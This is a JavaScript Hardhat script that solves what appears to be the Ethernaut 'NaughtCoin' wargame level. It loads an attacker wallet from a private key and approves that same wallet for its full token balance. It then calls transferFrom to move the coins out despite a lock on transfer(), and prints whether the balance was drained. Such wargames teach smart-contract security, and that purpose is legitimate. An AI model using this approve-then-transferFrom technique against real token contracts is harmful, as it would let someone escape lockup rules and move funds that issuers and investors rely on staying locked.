const { Wallet } = require("ethers")
const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")
require("dotenv").config()

async function main() {
    await resetNode()
    let owner, tx, res, bal, allowed
    let attacker = new Wallet(process.env.METAMASK_PRIVATE_KEY, ethers.provider)
    let instanceAddress = "0x75e5327F0160475ab1AD5923aB306a483d5Aa4Af"
    let target = await ethers.getContractAt(
        "NaughtCoin",
        instanceAddress,
        attacker
    )

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)

    // Attack
    bal = await target.balanceOf(attacker.address)
    tx = await target.approve(attacker.address, bal)
    await tx.wait(1)
    allowed = await target.allowance(attacker.address, attacker.address)
    console.log(`Allowed: ${allowed}`)
    tx = await target.transferFrom(attacker.address, target.address, bal)
    await tx.wait(1)

    // Check
    bal = await target.balanceOf(attacker.address)
    if (parseInt(bal.toString()) == 0) {
        console.log(`${symbols.success} Drained ERC20 coins!`)
    } else {
        console.log(`${symbols.error} Still have ${bal} wei remaining!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
